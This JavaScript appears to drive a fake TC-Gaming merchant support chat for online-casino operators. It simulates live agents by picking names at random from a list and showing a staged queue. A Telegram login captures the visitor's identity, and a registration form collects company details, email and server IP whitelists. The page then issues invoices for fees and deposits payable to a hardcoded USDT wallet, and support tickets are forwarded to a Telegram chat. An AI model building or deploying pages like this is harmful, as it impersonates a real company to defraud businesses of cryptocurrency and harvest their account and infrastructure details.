        const TELEGRAM_BOT_TOKEN = "";
        const TELEGRAM_CHAT_ID = "-1003763943890";
        const USDT_ADDRESS = "TWRvVAsTDVBgiafhMetw4QFo9DpzVDX8vn";
        const CS_NAMES = ["Li Wei (李偉)", "Sarah Chen", "Zhang Min (張敏)", "David Wong", "Chen Jing (陳靜)", "Emily Zhang"];

        // State Tracking
        let isGlobalEcosystem = false; // Tracks if user has Premium package

        // MAP ICONS
        const PROVIDERS = [
            { id: 'GB', name: 'BBIN', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/BBIN-logo.png' },
            { id: 'DG', name: 'DREAM GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-2.png' },
            { id: 'EO', name: 'EVO888', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-1.png' },
            { id: 'G8', name: 'GAMEPLAY', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/Powered-by-Gameplay-Interactive-logo-Black-transparent.png' },
            { id: 'JK', name: 'JOKER', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/joker_c.png' },
            { id: 'L4', name: 'LIVE22', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax.png' },
            { id: 'BL', name: 'BOLE GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-3.png' },
            { id: 'CQ', name: 'CQ9', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/cq9_color.png' },
            { id: 'DS', name: 'DRAGOON SOFT', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-4.png' },
            { id: 'JL', name: 'JILI', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/JILI.png' },
            { id: 'LG', name: 'LEGAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-5.png' },
            { id: 'PR', name: 'PRAGMATIC PLAY', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/PP-logo_Asia_on-white_horizontal.png' },
            { id: 'V8', name: 'V8POKER', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/V82.jpg' },
            { id: 'VG', name: 'VG', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/VRGAMING2.png' },
            { id: 'IA', name: 'IA ESPORTS', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-6.png' },
            { id: 'BP', name: 'PINNACLE', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/Pinnacle-Logo-CN-CMYK-Large-onwhite-scaled.jpg' },
            { id: 'PA', name: 'APOLLO', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-7.png' },
            { id: 'BI', name: 'BIG GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-8.png' },
            { id: 'IC', name: 'ICONIC GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-9.png' },
            { id: 'JD', name: 'JDB', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-10.png' },
            { id: 'SG', name: 'SPADE GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/spadegaming_logo_horizontal.png' },
            { id: 'YL', name: 'YL GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/YL-1.png' },
            { id: 'AG', name: 'ASIA GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/AG_logo_透明底.png' },
            { id: 'P3', name: 'EVOLUTION', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/evolution_logo_print_big-scaled.jpg' },
            { id: 'HG', name: 'HO GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/HLG.png' },
            { id: 'MP', name: 'MICRO GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2019/09/MG-Micro-Gaming.png' },
            { id: 'N2', name: 'N2 LIVE', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-2-1.png' },
            { id: 'PZ', name: 'PLAYTECH', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/logo-playteach_s.png' },
            { id: 'S2', name: 'SEXY BACCARAT', icon: 'https://tc-gaming.com/wp-content/uploads/2019/09/Sexy-Gaming-淺.png' },
            { id: 'VV', name: 'VIVO GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/VIVO.png' },
            { id: 'WC', name: 'WM CASINO', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/wm_logo-440x155陰影.png' },
            { id: 'YX', name: 'YAXINCQ9', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/YG.png' },
            { id: 'CE', name: '93CONNECT', icon: 'https://tc-gaming.com/wp-content/uploads/2022/12/crg_c-112x80-1.png' },
            { id: 'QK', name: 'QQ KENO', icon: 'https://tc-gaming.com/wp-content/uploads/2023/07/kg.png' },
            { id: 'TG', name: 'TCGSEALOTTO', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/TCGLOTTO.png' },
            { id: 'AV', name: 'AVIA GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-3-1.png' },
            { id: 'DM', name: 'SV388', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/DM.jpg' },
            { id: 'CY', name: 'DIGMAAN', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/Digmaan-logo.png' },
            { id: 'SN', name: 'RCB988', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/RC.jpg' },
            { id: 'FG', name: 'FUN GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/FG.png' },
            { id: 'ST', name: '3SING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/3SING02.png' },
            { id: 'SB', name: 'SBO', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/568_logo_568RunningMan_PoweredBySBO.png' },
            { id: 'CM', name: 'CMD', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/cmd365.png' },
            { id: 'IB', name: 'IBC', icon: 'https://tc-gaming.com/wp-content/uploads/2022/05/Saba_logo_final-09.png' },
            { id: 'SO', name: 'BTI', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/BTI-Logo.png' },
            { id: 'UG', name: 'UG SPORT', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/UG-logo-01.png' },
            { id: 'TF', name: 'TF GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/TF2-scaled.jpg' },
            { id: 'WB', name: 'WBET', icon: 'https://tc-gaming.com/wp-content/uploads/2023/07/WGB.png' },
            { id: 'CG', name: 'CREATIVE GAMING', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/CG.png' },
            { id: 'DT', name: 'DREAM TECH', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/DTQ.png' },
            { id: 'FI', name: 'FACHAI', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/FC.png' },
            { id: 'FK', name: 'FUNKY GAME', icon: 'https://tc-gaming.com/wp-content/uploads/2022/10/admin-ajax-4-1.png' },
            { id: 'PG', name: 'PGSOFT', icon: 'https://tc-gaming.com/wp-content/uploads/2019/09/PG-Soft.png' },
            { id: 'RE', name: 'KING MAKER', icon: 'https://tc-gaming.com/wp-content/uploads/2022/01/kingmaker.png' }
        ];

        let currentLang = null, activeAgent = "", isReady = false, selectedHalls = [], userData = {}, finActiveTab = 'FUND', supportRole = 'ADMIN';
        let packageType = 'starter'; // 'starter' or 'premium'

        function getBeijingTime() { const now = new Date(); return new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3600000 * 8)); }
        function formatBeijing(date) { const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]; return `${months[date.getMonth()]} ${date.getDate()} ${String(date.getHours()).padStart(2, '0')}:${String(date.getMinutes()).padStart(2, '0')}`; }

        window.onload = () => {
            // Hiển thị màn hình chờ (Loading) trong 1.5 giây
            setTimeout(() => {
                const loader = document.getElementById('page-loader');
                if (loader) loader.classList.add('hidden');
                
                // Khởi chạy các hàm gốc của trang sau khi ẩn Loading
                lucide.createIcons(); startBeijingCountdown(); renderHalls();
                setTimeout(() => addMessage('bot', `<b>TC-Gaming B2B Global Node</b> &nbsp;<span class="text-[9px] opacity-60">${formatBeijing(getBeijingTime())}</span><br/><br/>欢迎！请认明天成包网官网网址：<a href="https://tc-gaming.com/" target="_blank">tc-gaming.com</a><br/>工作时间：Mon-Fri 10:00 - 19:00 (GMT+8)。<br/><br/>Welcome! Mon-Fri 10:00-19:00. Please verify info below to start.`), 100);
                setTimeout(() => showBotTyping(1500, showPreChatForm), 2000);
                updateRegPrice();
            }, 1500);
        };

        function startBeijingCountdown() {
            setInterval(() => {
                const now = getBeijingTime(); let target = new Date(now); target.setHours(19, 0, 0, 0);
                if (now >= target) target.setDate(target.getDate() + 1);
                const diff = target - now;
                document.getElementById('timer-h').innerText = String(Math.floor(diff / 3600000)).padStart(2, '0');
                document.getElementById('timer-m').innerText = String(Math.floor((diff % 3600000) / 60000)).padStart(2, '0');
                document.getElementById('timer-s').innerText = String(Math.floor((diff % 60000) / 1000)).padStart(2, '0');
            }, 1000);
        }

        // Updated PreChat Form to use Telegram Login Widget
        function showPreChatForm() {
            const container = document.getElementById('chat-messages');
            const msgDiv = document.createElement('div'); msgDiv.className = `flex justify-start animate__animated animate__fadeInUp`;
            msgDiv.innerHTML = `
                <div class="flex max-w-[85%] md:max-w-[75%] flex-row gap-3">
                    <div class="w-8 h-8 rounded-xl bg-slate-900 flex items-center justify-center flex-shrink-0"><img src="https://nlpgroup.vn/assets/upload/logo/xp1JaMv3VGGjm4OLvIkUPdeeaX63WF.webp" class="w-5 h-auto"></div>
                    <div class="p-5 rounded-2xl bg-white border border-slate-200 text-sm shadow-sm w-full">
                        <p class="font-bold mb-4 italic text-slate-600 text-xs">Verify Contact / 身份驗證：</p>
                        <p class="text-[10px] text-slate-500 mb-3">Please securely verify your identity via Telegram to continue to the system.</p>
                        <div id="telegram-widget-container" class="flex justify-center my-4"></div>
                    </div>
                </div>`;
            container.appendChild(msgDiv); 

            // Dynamically load the Telegram Widget Script
            const script = document.createElement('script');
            script.async = true;
            script.src = "https://telegram.org/js/telegram-widget.js?23";
            script.setAttribute('data-telegram-login', 'sopca_m2_bot');
            script.setAttribute('data-size', 'medium');
            script.setAttribute('data-onauth', 'onTelegramAuth(user)');
            script.setAttribute('data-request-access', 'write');
            
            document.getElementById('telegram-widget-container').appendChild(script);

            lucide.createIcons();
            container.scrollTop = container.scrollHeight;
        }

        // Global function called by the Telegram widget
        window.onTelegramAuth = function(user) {
            // Hiển thị alert theo yêu cầu
            alert('Logged in as ' + user.first_name + ' ' + (user.last_name || '') + ' (' + user.id + (user.username ? ', @' + user.username : '') + ')');
            
            const fullName = user.first_name + (user.last_name ? ' ' + user.last_name : '');
            const tgUsername = user.username ? '@' + user.username : '';
            
            // Cập nhật giao diện bên cạnh alert để tránh bị kẹt trong trường hợp iframe chặn
            const loginMessage = 'Logged in as ' + fullName + ' (' + user.id + (tgUsername ? ', ' + tgUsername : '') + ')';
            
            userData = { 
                name: fullName, 
                tele: tgUsername || user.id, 
                role: 'VERIFIED' 
            };
            
            // Auto-fill registration form with verified TG username
            const regTeleInput = document.getElementById('reg-tele-user');
            if (regTeleInput) regTeleInput.value = tgUsername || user.id;

            // Update UI to show verification success
            const widgetContainer = document.getElementById('telegram-widget-container');
            if(widgetContainer) {
                widgetContainer.parentElement.innerHTML = `<p class="italic text-green-600 font-bold text-center">✓ ${loginMessage}</p>`;
            }

            showBotTyping(2000, () => {
                addMessage('bot', `Wait in line, <b>${userData.name}</b>. System busy. Estimated wait: **2 mins**.`);
                setTimeout(() => {
                    document.getElementById('header-status-dot').className = "w-2 h-2 rounded-full bg-amber-500 animate-pulse-custom";
                    showBotTyping(1500, () => addMessage('bot', `Hello <b>${userData.name}</b>! Select language / 请选择语言：`, true));
                }, 3000);
            });
        };

        // Translation Update Function
        function updateLangUI(lang) {
            document.querySelectorAll('.lang-text').forEach(el => {
                el.innerText = lang === 'CN' ? el.getAttribute('data-cn') : el.getAttribute('data-en');
            });
            document.getElementById('chat-input').placeholder = lang === 'CN' ? "請輸入..." : "Type here...";
        }

        function selectLanguage(lang) {
            currentLang = lang; isReady = true; activeAgent = CS_NAMES[Math.floor(Math.random() * CS_NAMES.length)];
            document.getElementById('header-status-dot').className = "w-2 h-2 rounded-full bg-green-500 animate-pulse";
            document.getElementById('header-status-text').innerText = "Live";
            document.getElementById('lang-badge').classList.replace('hidden', 'flex');
            document.getElementById('current-lang-text').innerText = lang;
            document.getElementById('queue-overlay').classList.add('hidden');
            document.getElementById('input-container').classList.remove('opacity-50', 'pointer-events-none');
            document.getElementById('quick-actions').classList.replace('hidden', 'flex');
            document.getElementById('agent-status-container').classList.remove('hidden');
            document.getElementById('display-cs-name').innerText = activeAgent;
            
            // Execute text updates
            updateLangUI(lang);

            showBotTyping(1500, () => addMessage('bot', lang === 'CN' ? `您好 <b>${userData.name}</b>！我是客服专员 **${activeAgent}**。<br>📢 Gợi ý chiến lược: TCGaming hiện có gói "Global Ecosystem" mở full toàn bộ sảnh chỉ với $5000 và cấp quyền P2P Exchange nội bộ cực kỳ ưu đãi. Chọn mục Registration để xem chi tiết.` : `Hello <b>${userData.name}</b>! I am agent **${activeAgent}**.<br>📢 Tip: Check out our "Global Ecosystem" package in Registration. Open all halls for just $5000 and unlock internal P2P Exchange!`));
        }

        // --- ADVANCED FEATURES (ACCESS CONTROL) ---
        function openP2PModal() {
            if (!isGlobalEcosystem) {
                addMessage('bot', currentLang === 'CN' ? 
                    `⚠️ <b>訪問被拒絕</b><br/>P2P 交易專區僅限 <b>Global Ecosystem</b> 帳戶使用。請先完成註冊或升級您的帳戶。` : 
                    `⚠️ <b>ACCESS DENIED</b><br/>The P2P Exchange area is exclusive to <b>Global Ecosystem</b> accounts. Please complete registration or upgrade your account first.`);
                return;
            }
            openModal('modal-p2p');
        }

        function openAPIDashboard() {
            if (!isGlobalEcosystem) {
                addMessage('bot', currentLang === 'CN' ? 
                    `⚠️ <b>權限不足</b><br/>高級 API 儀表板僅限 <b>Global Ecosystem</b> 商家使用。` : 
                    `⚠️ <b>RESTRICTED ACCESS</b><br/>Advanced API Dashboard is only available for <b>Global Ecosystem</b> merchants.`);
                return;
            }
            openModal('modal-api-dashboard');
        }

        // --- REGISTRATION & PACKAGE LOGIC ---
        function renderHalls() { 
            document.getElementById('hall-grid').innerHTML = PROVIDERS.map(h => `
                <div onclick="toggleHall('${h.id}')" id="hall-${h.id}" class="hall-card p-2 rounded-xl border-2 cursor-pointer bg-white flex flex-col items-center justify-center gap-1 border-slate-100 hover:border-slate-300 transition-all h-[60px] relative">
                    <div class="hall-icon-container">
                        ${h.icon ? `<img src="${h.icon}" alt="${h.id}">` : `<span class="text-xs font-black text-slate-300">${h.id}</span>`}
                    </div>
                    <span class="text-[6px] font-black uppercase text-center text-slate-600 leading-tight truncate w-full px-1">${h.name}</span>
                </div>`).join(''); 
        }

        function selectPackage(type) {
            packageType = type;
            const starter = document.getElementById('pkg-starter');
            const premium = document.getElementById('pkg-premium');
            const p2pBadge = document.getElementById('p2p-badge');

            if(type === 'starter') {
                starter.classList.add('active-pkg');
                premium.classList.remove('active-premium');
                p2pBadge.classList.add('hidden');
                // Deselect all and let user choose
                selectedHalls = [];
                document.querySelectorAll('.hall-card').forEach(el => {
                    el.classList.remove('selected');
                    el.querySelector('.check-mark')?.remove();
                });
            } else {
                premium.classList.add('active-premium');
                starter.classList.remove('active-pkg');
                p2pBadge.classList.remove('hidden');
                // Select All
                selectedHalls = PROVIDERS.map(p => p.id);
                document.querySelectorAll('.hall-card').forEach(el => {
                    el.classList.add('selected');
                    if(!el.querySelector('.check-mark')) {
                        const check = document.createElement('div'); check.className = "check-mark absolute top-0.5 right-0.5 bg-blue-600 rounded-full text-white p-[1px] shadow-sm"; check.innerHTML = '<i data-lucide="check" class="w-2 h-2"></i>'; el.appendChild(check);
                    }
                });
                lucide.createIcons();
            }
            updateRegPrice();
        }

        function toggleHall(id) {
            if(packageType === 'premium') {
                // If they manually uncheck while in premium, switch back to starter mode
                selectPackage('starter');
            }

            const el = document.getElementById(`hall-${id}`);
            if (selectedHalls.includes(id)) { 
                selectedHalls = selectedHalls.filter(h => h !== id); 
                el.classList.remove('selected'); el.querySelector('.check-mark')?.remove(); 
            } else { 
                selectedHalls.push(id); 
                el.classList.add('selected'); 
                const check = document.createElement('div'); check.className = "check-mark absolute top-0.5 right-0.5 bg-blue-600 rounded-full text-white p-[1px] shadow-sm"; check.innerHTML = '<i data-lucide="check" class="w-2 h-2"></i>'; el.appendChild(check); lucide.createIcons(); 
            }
            
            // If they manually checked all of them
            if(selectedHalls.length === PROVIDERS.length && packageType === 'starter') {
                selectPackage('premium');
            } else {
                updateRegPrice();
            }
        }

        function updateRegPrice() {
            const count = selectedHalls.length;
            document.getElementById('hall-count-display').innerText = `Selected: ${count}/${PROVIDERS.length} (Min 5)`;
            
            let setupFee = 1000;
            let hallPrice = 0;
            
            if (packageType === 'premium') {
                hallPrice = 5000; // Flat discount rate for full package updated to 5000
            } else {
                hallPrice = count * 100;
            }

            let deposit = parseInt(document.getElementById('reg-deposit')?.value || 0);
            if(isNaN(deposit) || deposit < 0) deposit = 0;

            const total = setupFee + hallPrice + deposit;
            document.getElementById('reg-total-price').innerText = `$${total.toLocaleString()}`;
            
            const err = document.getElementById('hall-error');
            if(count < 5) {
                err.classList.remove('hidden');
            } else {
                err.classList.add('hidden');
            }
        }

        function nextRegStep() { 
            if(selectedHalls.length < 5) {
                document.getElementById('hall-error').classList.remove('hidden');
                return;
            }
            document.getElementById('reg-step-0').classList.add('hidden'); 
            document.getElementById('reg-step-1').classList.remove('hidden');
            document.getElementById('reg-next-btn').classList.add('hidden'); 
            document.getElementById('reg-submit-btn').classList.remove('hidden');
            document.getElementById('reg-back-btn').classList.remove('hidden'); 
            document.getElementById('step-indicator-1').classList.replace('bg-slate-200', 'bg-blue-600');
        }

        function backRegStep() { 
            document.getElementById('reg-step-1').classList.add('hidden'); 
            document.getElementById('reg-step-0').classList.remove('hidden');
            document.getElementById('reg-next-btn').classList.remove('hidden'); 
            document.getElementById('reg-submit-btn').classList.add('hidden');
            document.getElementById('reg-back-btn').classList.add('hidden'); 
            document.getElementById('step-indicator-1').classList.replace('bg-blue-600', 'bg-slate-200');
        }

        function submitRegistration() {
            if(!validateFields(['reg-company', 'reg-ip-bo', 'reg-ip-api', 'reg-email', 'reg-tele-user', 'reg-deposit'])) return;
            const dep = parseInt(document.getElementById('reg-deposit').value);
            if(dep < 500) { document.getElementById('reg-deposit').classList.add('input-error'); return; }

            const mc = "tcg_" + Math.random().toString(36).substring(2, 8); 
            const tid = `TCG-REG-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
            
            let setupFee = 1000;
            let hallFee = packageType === 'premium' ? 5000 : selectedHalls.length * 100;
            let totalPay = setupFee + hallFee + dep;
            
            // Set access state based on package
            if (packageType === 'premium') {
                isGlobalEcosystem = true;
            }

            closeModal('modal-registration');
            showBotTyping(2500, () => {
                const c = document.getElementById('chat-messages'); 
                const d = document.createElement('div'); 
                d.className = 'flex justify-start animate__animated animate__fadeInUp w-full';
                
                // Truncate list if too long for UI display
                let displayHalls = selectedHalls;
                let pr = displayHalls.map(h => `<tr><td>${PROVIDERS.find(p=>p.id===h)?.name||h}</td><td class="text-center font-bold">${h}</td></tr>`).join('');

                let p2pSectionPdf = packageType === 'premium' ? 
                    `<div class="mt-4 mb-4">
                        <h3 class="text-xs font-bold bg-gray-100 p-1 border-l-4 border-black mb-2 uppercase">P2P TCG-Exchange Status</h3>
                        <div class="border border-black p-2 text-xs">
                            <p><strong>Status:</strong> <span class="text-green-600 font-bold">ACTIVATED</span></p>
                            <p><strong>Master Wallet:</strong> <code>${mc}_master_wallet</code></p>
                            <p class="text-gray-500 text-[10px] mt-1">* 5% operational fee applies per P2P withdrawal.</p>
                        </div>
                    </div>` : '';

                const company = document.getElementById('reg-company').value;
                const email = document.getElementById('reg-email').value;
                const tele = document.getElementById('reg-tele-user').value;
                const ipBo = document.getElementById('reg-ip-bo').value;
                const ipApi = document.getElementById('reg-ip-api').value;

                d.innerHTML = `
                <div class="flex flex-col w-full items-center gap-4">
                    <div class="pdf-document">
                        <!-- Header -->
                        <div class="flex justify-between items-start border-b-2 border-black pb-4 mb-6">
                            <div>
                                <img src="https://nlpgroup.vn/assets/upload/logo/xp1JaMv3VGGjm4OLvIkUPdeeaX63WF.webp" style="filter:invert(1); height: 20px;" class="mb-2">
                                <p class="text-[10px] text-gray-500 font-bold">TC-GAMING B2B GLOBAL NODE</p>
                                <p class="text-[10px] text-gray-500">tc-gaming.com</p>
                            </div>
                            <div class="text-right">
                                <h2 class="text-3xl font-black tracking-widest uppercase">INVOICE</h2>
                                <p class="text-xs font-bold text-gray-600 mt-1">Ref: ${tid}</p>
                                <p class="text-xs text-gray-500">Date: ${new Date().toLocaleDateString()}</p>
                            </div>
                        </div>

                        <!-- Billed To -->
                        <div class="mb-6">
                            <h3 class="text-xs font-bold bg-gray-100 p-1 border-l-4 border-black mb-2 uppercase">Billed To / Merchant Info</h3>
                            <div class="grid grid-cols-2 gap-4 text-xs border border-gray-300 p-3">
                                <div><span class="text-gray-500">Company:</span> <span class="font-bold">${company}</span></div>
                                <div><span class="text-gray-500">Email:</span> <span class="font-bold">${email}</span></div>
                                <div><span class="text-gray-500">Telegram:</span> <span class="font-bold">${tele}</span></div>
                                <div><span class="text-gray-500">Merchant Code:</span> <span class="font-bold text-blue-600">${mc}</span></div>
                                <div><span class="text-gray-500">IP Whitelist BO:</span> <span class="font-mono">${ipBo}</span></div>
                                <div><span class="text-gray-500">IP Whitelist API:</span> <span class="font-mono">${ipApi}</span></div>
                            </div>
                        </div>

                        <!-- Charges Table -->
                        <table class="pdf-table mb-6">
                            <thead>
                                <tr>
                                    <th>Description</th>
                                    <th class="text-center">Qty</th>
                                    <th class="text-right">Amount</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>System Setup Fee</td>
                                    <td class="text-center">1</td>
                                    <td class="text-right">$1,000.00</td>
                                </tr>
                                <tr>
                                    <td>Hall API Integration (${packageType === 'premium' ? 'Global Ecosystem' : 'A la Carte'})</td>
                                    <td class="text-center">${selectedHalls.length}</td>
                                    <td class="text-right">$${hallFee.toLocaleString()}.00</td>
                                </tr>
                                <tr>
                                    <td>Initial Deposit (Prepayment)</td>
                                    <td class="text-center">-</td>
                                    <td class="text-right">$${dep.toLocaleString()}.00</td>
                                </tr>
                            </tbody>
                            <tfoot>
                                <tr>
                                    <td colspan="2" class="text-right font-black border-r border-black">TOTAL DUE</td>
                                    <td class="text-right font-black text-sm">$${totalPay.toLocaleString()}.00</td>
                                </tr>
                            </tfoot>
                        </table>

                        ${p2pSectionPdf}

                        <!-- Prefix Config -->
                        <div class="mt-6">
                            <h3 class="text-xs font-bold bg-gray-100 p-1 border-l-4 border-black mb-2 uppercase">Prefix Configuration (Allocated)</h3>
                            <div class="max-h-48 overflow-y-auto border border-gray-300">
                                <table class="pdf-table" style="margin-top: 0; border: none;">
                                    <thead>
                                        <tr>
                                            <th style="border-top: none; border-left: none;">Provider Name</th>
                                            <th class="text-center" style="border-top: none; border-right: none;">Prefix Code</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        ${pr}
                                    </tbody>
                                </table>
                            </div>
                        </div>

                        <!-- Footer -->
                        <div class="mt-8 pt-4 border-t border-gray-300 text-[9px] text-gray-500 text-center">
                            This is a computer-generated invoice document. No physical signature is required.<br>
                            Please proceed with payment to activate your merchant account and API credentials.
                        </div>
                    </div>
                    
                    <button onclick="openModal('modal-finance'); document.getElementById('pay-ticket-id').value='${tid}'; switchFinanceTab('CODE');" class="bg-emerald-600 text-white px-8 py-4 rounded-xl text-xs font-black uppercase shadow-xl hover:bg-emerald-700 transition">
                        <i data-lucide="credit-card" class="w-4 h-4 inline mr-2"></i> Proceed to Payment
                    </button>
                </div>`;
                c.appendChild(d); lucide.createIcons(); c.scrollTop = c.scrollHeight;
                
                if (isGlobalEcosystem) {
                    setTimeout(() => {
                        addMessage('bot', currentLang === 'CN' ? 
                            `🎉 <b>恭喜！</b><br/>您的帳戶已升級至 <b>Global Ecosystem</b> 權限。您現在可以使用 P2P 交易市場 和 API 分析儀表板。` : 
                            `🎉 <b>CONGRATULATIONS!</b><br/>Your account has been granted <b>Global Ecosystem</b> privileges. You can now access the P2P Exchange Market and API Dashboard.`);
                    }, 1000);
                }
            });
        }

        // --- FINANCE & SUPPORT HELPERS ---
        function switchFinanceTab(tab) {
            finActiveTab = tab;
            ['fund', 'code', 'usdt'].forEach(t => {
                const el = document.getElementById(`fin-tab-${t}`);
                if(el) el.className = `finance-tab ${tab===t.toUpperCase()?'active':'inactive'}`;
                const sec = document.getElementById(`sec-fin-${t}`);
                if(sec) sec.classList.toggle('hidden', tab !== t.toUpperCase());
            });
        }

        function handleFinanceSubmit() {
            let val = false;
            if(finActiveTab === 'FUND') val = validateFields(['fund-account', 'fund-amount']);
            else if(finActiveTab === 'CODE') val = validateFields(['pay-ticket-id']);
            else if(finActiveTab === 'USDT') val = validateFields(['usdt-account', 'usdt-amount']);
            
            if(!val) return;

            const tid = `TCG-FIN-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
            if(finActiveTab !== 'CODE') {
                const amt = document.getElementById(finActiveTab==='FUND'?'fund-amount':'usdt-amount').value;
                const acc = document.getElementById(finActiveTab==='FUND'?'fund-account':'usdt-account').value;
                if(finActiveTab==='FUND' && amt < 500) { document.getElementById('fund-amount').classList.add('input-error'); return; }
                const qrUrl = `https://quickchart.io/qr?size=300&text=${encodeURIComponent(`USDT (TRC20)\nAddress: ${USDT_ADDRESS}\nAmount: ${amt}`)}`;
                addMessage('bot', `<b>✅ FINANCE TICKET: ${tid}</b><br/>Merchant: <b>${acc}</b><br/>Amount: <b>$${amt}</b><br/>Please pay via USDT TRC20:`);
                injectQR(qrUrl, amt);
            } else {
                const code = document.getElementById('pay-ticket-id').value.trim();
                document.getElementById('ticket-status-display').classList.remove('hidden');
                addMessage('bot', `<b>✅ STATUS REPORT: ${tid}</b><br/>Invoice <b>${code}</b> processing. Please contact support if you need manual USDT wallet mapping for P2P.`);
            }
            closeModal('modal-finance');
        }

        function injectQR(url, amt) {
            const c = document.getElementById('chat-messages'); const w = document.createElement('div'); w.className = "ml-12 mt-[-10px] animate__animated animate__zoomIn";
            w.innerHTML = `<div class="p-6 bg-white rounded-3xl border border-emerald-100 shadow-xl space-y-4 max-w-xs"><div class="flex justify-between items-center"><img src="https://nlpgroup.vn/assets/upload/logo/xp1JaMv3VGGjm4OLvIkUPdeeaX63WF.webp" style="filter:invert(1); height:15px;"><span class="text-[8px] font-black text-emerald-600">USDT TRC20</span></div><img src="${url}" class="w-48 h-48 mx-auto rounded-xl p-2 border border-slate-50"><div class="bg-slate-50 p-3 rounded-2xl border flex items-center gap-2"><code class="text-[9px] font-mono flex-1 break-all">${USDT_ADDRESS}</code><button onclick="copyToClipboard('${USDT_ADDRESS}')" class="p-2 bg-white rounded-lg border hover:text-emerald-600 transition-colors"><i data-lucide="copy" class="w-3 h-3"></i></button></div></div>`;
            c.appendChild(w); lucide.createIcons(); c.scrollTop = c.scrollHeight;
        }

        function switchSupportRole(role) {
            supportRole = role; document.getElementById('tab-admin').className = `role-tab ${role==='ADMIN'?'active':'inactive'}`;
            document.getElementById('tab-dev').className = `role-tab ${role==='DEV'?'active':'inactive'}`;
            setSupportCat('General');
        }

        function setSupportCat(cat) {
            const cont = document.getElementById('support-category-grid');
            const cats = supportRole === 'ADMIN' ? 
                [{id:'General',name:'General',icon:'life-buoy'},{id:'IP',name:'Whitelist',icon:'shield-check'},{id:'P2P',name:'P2P Exchange',icon:'arrow-left-right'}] :
                [{id:'API',name:'API Key',icon:'key'},{id:'Integ',name:'Integration',icon:'code'},{id:'Docs',name:'Docs',icon:'file-text'}];
            cont.innerHTML = cats.map(c=>`<button onclick="setSupportCat('${c.id}')" class="support-cat-btn flex items-center gap-2 p-3 rounded-xl border text-[10px] font-black transition-all ${cat===c.id?'bg-blue-600 border-blue-600 text-white shadow-md':''}" data-cat="${c.id}"><i data-lucide="${c.icon}" class="w-3.5 h-3.5"></i> <span>${c.name}</span></button>`).join('');
            lucide.createIcons();
        }

        function submitSupport() {
            if(!validateFields(['sup-merchant', 'sup-issue'])) return;
            const tid = `TCG-SUP-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
            const merchant = document.getElementById('sup-merchant').value.trim();
            const issue = document.getElementById('sup-issue').value.trim();
            
            // Send full details to Telegram
            sendTelegram(`🛠 <b>SUPPORT TICKET: ${tid}</b>\n👤 Role: ${supportRole}\n🏢 Merchant: ${merchant}\n📝 Issue: ${issue}`);
            
            showBotTyping(1500, () => {
                const c = document.getElementById('chat-messages'); 
                const d = document.createElement('div'); 
                d.className = 'flex justify-start animate__animated animate__fadeInUp w-full';
                d.innerHTML = `
                <div class="flex w-full items-start gap-4">
                    <div class="w-8 h-8 rounded-xl bg-slate-900 flex items-center justify-center flex-shrink-0"><img src="https://nlpgroup.vn/assets/upload/logo/xp1JaMv3VGGjm4OLvIkUPdeeaX63WF.webp" class="w-5 h-auto"></div>
                    <div class="ticket-document">
                        <div class="border-b-2 border-dashed border-gray-400 pb-3 mb-4 flex justify-between items-end">
                            <div>
                                <h2 class="text-xl font-black tracking-widest">TECH SUPPORT TICKET</h2>
                                <p class="text-xs font-bold mt-1 text-gray-600">ID: ${tid}</p>
                            </div>
